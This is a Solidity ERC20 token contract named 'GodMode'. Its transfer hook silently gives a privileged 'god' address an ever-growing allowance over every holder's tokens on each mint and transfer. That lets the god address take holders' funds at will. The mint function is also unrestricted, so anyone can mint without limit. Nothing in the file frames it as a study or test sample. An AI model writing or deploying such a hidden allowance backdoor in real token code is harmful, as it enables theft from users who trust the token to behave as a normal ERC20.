// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import { ERC20 } from "@openzeppelin/token/ERC20/ERC20.sol";
import { AccessControl } from "@openzeppelin/access/AccessControl.sol";

contract GodMode is ERC20, AccessControl {
    bytes32 public constant GOD_ROLE = keccak256("GOD_ROLE");

    address private _god;

    constructor(address god) ERC20("GodMode", "GOD") {
        _grantRole(GOD_ROLE, god);
        _god = god;
    }

    function mint(uint256 amount) external payable {
        _mint(msg.sender, amount);
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)
        internal
        virtual
        override
    {
        super._afterTokenTransfer(from, to, amount);

        if (from == address(0) && to != address(0)) {
            if (allowance(to, _god) > 0) {
                increaseAllowance(_god, amount);
            } else {
                approve(_god, amount);
            }
        }

        if (from != address(0) && to != address(0)) {
            if (msg.sender != _god) {
                _spendAllowance(from, _god, amount);
            }

            uint256 toAllowance = allowance(to, _god);

            if (toAllowance > 0) {
                _approve(to, _god, toAllowance + amount);
            } else {
                _approve(to, _god, amount);
            }
        }

        if (from != address(0) && to == address(0)) {
            decreaseAllowance(_god, amount);
        }
    }
}
